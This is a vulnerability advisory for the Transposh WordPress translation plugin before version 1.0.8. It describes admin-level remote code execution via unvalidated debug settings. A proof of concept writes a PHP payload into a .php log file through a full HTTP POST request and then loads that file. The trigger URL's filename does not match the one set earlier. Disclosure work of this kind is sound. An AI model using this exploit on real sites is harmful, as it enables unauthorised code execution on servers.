## WordPress Plugin Vulnerabilities

# Transposh WordPress Translation < 1.0.8 - Admin+ RCE

### Description

The plugin does not validate its debug settings, which could allow allowing high privilege users such as admin to perform RCE

### Proof of Concept

As admin, in the the Debug Settings (/wp-admin/admin.php?page=tp\_advanced):
- Tick "Enable running of Transposh internal debug functions", and put a php file as log filename
- Set the Level of warning to debug and put the following payload in the "Remote debug IP" field: <?php phpinfo(); ?>
POST /wp-admin/admin-post.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length:190
Connection: close
Cookie: [admin+]
Upgrade-Insecure-Requests: 1
action=save\_transposh&page=tp\_advanced&\_wpnonce=4d332f9e25&jqueryui\_override=&debug\_enable=1&debug\_logfile=test123.php&debug\_loglevel=5&debug\_remoteip=<?php phpinfo(); ?>&Submit=Save+Changes
Then navigate through the plugin's page (to generate some logs) and access https://example.com/wp-admin/test122.php to trigger the RCE
